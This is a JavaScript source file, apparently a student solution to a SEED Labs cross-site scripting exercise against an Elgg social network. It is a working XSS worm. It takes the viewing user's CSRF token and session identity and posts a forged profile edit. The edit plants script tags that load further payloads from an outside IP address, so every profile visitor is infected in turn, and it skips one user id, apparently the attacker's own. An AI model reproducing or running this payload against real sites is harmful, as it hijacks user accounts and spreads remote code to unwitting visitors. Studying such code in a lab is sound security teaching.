const script_2 = async () => {
    const url = `http://www.seed-server.com/action/profile/edit`

    const formData = new FormData();

    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="__elgg_token"

    formData.set(`__elgg_token`, elgg.security.token.__elgg_token);

    // Fe7Ne6d1YCTanEjMdNiwrw
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="__elgg_ts"

    formData.set(`__elgg_ts`, elgg.security.token.__elgg_ts);

    // 1708024850
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="name"

    formData.set(`name`, elgg.session.user.name);

    // Alice
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="description"

    const link_1=`<script type=text/javascript src=http://20.249.212.251:3030/script_1.js></script>`
    const link_2=`<script type=text/javascript src=http://20.249.212.251:3030/script_2.js></script>`
    const link_3=`<script type=text/javascript src=http://20.249.212.251:3030/script_3.js></script>`
    const link=`<script type=text/javascript src=http://20.249.212.251:3030/script.js></script>`

    formData.set(`description`, `<p>1805066</p>${link}${link_1}${link_2}${link_3}`);

    // <p>this is a description</p>

    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="accesslevel[description]"

    formData.set(`accesslevel[description]`, `1`);

    // 1
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="briefdescription"

    formData.set(`briefdescription`, `random string`);

    // this is a brief description
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="accesslevel[briefdescription]"

    formData.set(`accesslevel[briefdescription]`, `1`);

    // 1
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="location"

    formData.set(`location`, `random string`);

    // location
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="accesslevel[location]"

    formData.set(`accesslevel[location]`, `1`);

    // 1
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="interests"

    formData.set(`interests`, `random string`);

    // interests
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="accesslevel[interests]"

    formData.set(`accesslevel[interests]`, `1`);

    // 1
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="skills"

    formData.set(`interests`, `random string`);

    // skills
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="accesslevel[skills]"

    formData.set(`accesslevel[skills]`, `1`);

    // 1
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="contactemail"

    formData.set(`contactemail`, `random.string@gmail.com`);

    // hello@gmail.com
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="accesslevel[contactemail]"

    formData.set(`accesslevel[contactemail]`, `1`);

    // 1
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="phone"

    formData.set(`phone`, `random string`);

    // b
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="accesslevel[phone]"

    formData.set(`accesslevel[phone]`, `1`);

    // 1
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="mobile"

    formData.set(`mobile`, `random string`);

    // c
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="accesslevel[mobile]"

    formData.set(`accesslevel[mobile]`, `1`);

    // 1
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="website"

    formData.set(`website`, `https://random-string.com`);

    // https://hello.com
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="accesslevel[website]"

    formData.set(`accesslevel[website]`, `1`);

    // 1
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="twitter"

    formData.set(`twitter`, `random string`);

    // e
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="accesslevel[twitter]"

    formData.set(`accesslevel[twitter]`, `1`);

    // 1
    // -----------------------------353134234621141183101734432516
    // Content-Disposition: form-data; name="guid"

    formData.set(`guid`, `${elgg.session.user.guid}`);

    // 56
    // -----------------------------353134234621141183101734432516--
    if (elgg.session.user.guid != 59) {
        await fetch(url, {
            method: `POST`,
            body: formData
        })
    }
}